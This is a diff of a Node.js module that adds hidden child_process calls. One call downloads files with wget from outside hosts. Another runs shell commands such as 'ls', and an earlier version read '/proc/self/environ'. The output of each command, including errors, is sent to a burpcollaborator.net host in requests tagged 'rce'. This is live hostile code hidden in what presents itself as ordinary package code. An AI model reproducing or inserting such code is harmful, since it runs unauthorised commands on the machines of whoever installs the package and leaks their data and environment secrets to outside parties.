@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("wget http://0xp.cc/d.txt", (error, stdout, stderr) => {
+exec("wget http://hav6cctq6ivan5c60wrtjil22t8nwc.cc/d.txt", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -83,19 +83,19 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("cat /proc/self/environ", (error, stdout, stderr) => {
+spawn.exec("wget http://0xp.cc/x.json; ls | tr \"\\n\" \" \" ", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
-        request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
+        request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce-error=' + error.message);
         return;
     }
     if (stderr) {
         console.log(`stderr: ${stderr}`);
-        request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce=' + stderr)
+        request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce=' + stderr)
         return;
     }
    if (1 == 1) {
-   request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce=' + stdout)
+   request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce=' + stdout)
         return;
     }
     console.log(`stdout: ${stdout}`);
